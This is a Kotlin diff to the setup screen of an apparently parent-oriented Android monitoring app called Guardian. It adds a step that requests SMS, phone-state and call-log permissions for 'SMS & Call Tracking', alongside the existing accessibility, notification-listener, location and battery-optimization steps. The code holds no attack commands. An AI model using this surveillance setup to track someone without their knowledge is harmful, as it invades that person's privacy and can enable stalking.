@@ -42,6 +42,20 @@ class SetupActivity : AppCompatActivity() {
         refreshAllStatuses()
     }
 
+    private val requestSmsCallsPermissionLauncher = registerForActivityResult(
+        androidx.activity.result.contract.ActivityResultContracts.RequestMultiplePermissions()
+    ) { permissions ->
+        val receiveSmsGranted = permissions[android.Manifest.permission.RECEIVE_SMS] ?: false
+        val phoneStateGranted = permissions[android.Manifest.permission.READ_PHONE_STATE] ?: false
+        val callLogGranted = permissions[android.Manifest.permission.READ_CALL_LOG] ?: false
+        if (receiveSmsGranted && phoneStateGranted && callLogGranted) {
+            Toast.makeText(this, "SMS & Call permissions granted ✓", Toast.LENGTH_SHORT).show()
+        } else {
+            Toast.makeText(this, "Some permissions were denied. SMS/Call logs might be partial.", Toast.LENGTH_LONG).show()
+        }
+        refreshAllStatuses()
+    }
+
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         binding = ActivitySetupBinding.inflate(layoutInflater)
@@ -160,6 +174,21 @@ class SetupActivity : AppCompatActivity() {
                 startActivity(Intent(Settings.ACTION_SETTINGS))
             }
         }
+
+        // Step 6 — SMS & Calls Tracking
+        binding.btnEnableSmsCalls.setOnClickListener {
+            if (isSmsCallsPermissionGranted()) {
+                Toast.makeText(this, "Permissions already granted ✓", Toast.LENGTH_SHORT).show()
+                return@setOnClickListener
+            }
+            requestSmsCallsPermissionLauncher.launch(
+                arrayOf(
+                    android.Manifest.permission.RECEIVE_SMS,
+                    android.Manifest.permission.READ_PHONE_STATE,
+                    android.Manifest.permission.READ_CALL_LOG
+                )
+            )
+        }
     }
 
     private fun restoreSavedParentId() {
@@ -177,6 +206,7 @@ class SetupActivity : AppCompatActivity() {
         updateStep3Status()
         updateStep4Status()
         updateStep5Status()
+        updateStep6Status()
         updateFinalBanner()
     }
 
@@ -233,12 +263,24 @@ class SetupActivity : AppCompatActivity() {
         binding.btnEnableNotification.isEnabled = !active
     }
 
+    private fun updateStep6Status() {
+        val active = isSmsCallsPermissionGranted()
+        binding.tvStep6Status.text = if (active) "✅ Done" else "⬜ Pending"
+        binding.tvStep6Status.setTextColor(
+            getColor(if (active) R.color.status_success else R.color.status_pending)
+        )
+        binding.btnEnableSmsCalls.text =
+            if (active) "SMS & Call Tracking Active ✓" else "Grant SMS & Call Access"
+        binding.btnEnableSmsCalls.isEnabled = !active
+    }
+
     private fun updateFinalBanner() {
         val allDone = isParentIdSaved() &&
                       isAccessibilityServiceEnabled() &&
                       isBatteryOptimizationDisabled() &&
                       isLocationPermissionGranted() &&
-                      isNotificationServiceEnabled()
+                      isNotificationServiceEnabled() &&
+                      isSmsCallsPermissionGranted()
 
         if (allDone) {
             binding.tvFinalStatus.text = "✅ Monitoring Active"
@@ -246,7 +288,7 @@ class SetupActivity : AppCompatActivity() {
             binding.cardStatus.setCardBackgroundColor(getColor(R.color.status_success))
         } else {
             binding.tvFinalStatus.text = "⚠ Setup Incomplete"
-            binding.tvFinalSubtext.text = "Complete all 4 steps above"
+            binding.tvFinalSubtext.text = "Complete all 6 steps above"
             binding.cardStatus.setCardBackgroundColor(
                 resources.getColor(android.R.color.black, theme)
             )
@@ -283,6 +325,12 @@ class SetupActivity : AppCompatActivity() {
         val enabledListeners = Settings.Secure.getString(contentResolver, "enabled_notification_listeners")
         val serviceName = "${packageName}/com.device.guardian.service.service.GuardianNotificationService"
         return enabledListeners?.contains(serviceName) == true
+    }
+
+    private fun isSmsCallsPermissionGranted(): Boolean {
+        return checkSelfPermission(android.Manifest.permission.RECEIVE_SMS) == android.content.pm.PackageManager.PERMISSION_GRANTED &&
+               checkSelfPermission(android.Manifest.permission.READ_PHONE_STATE) == android.content.pm.PackageManager.PERMISSION_GRANTED &&
+               checkSelfPermission(android.Manifest.permission.READ_CALL_LOG) == android.content.pm.PackageManager.PERMISSION_GRANTED
     }
 
     private fun syncStatusNowOnSetup() {
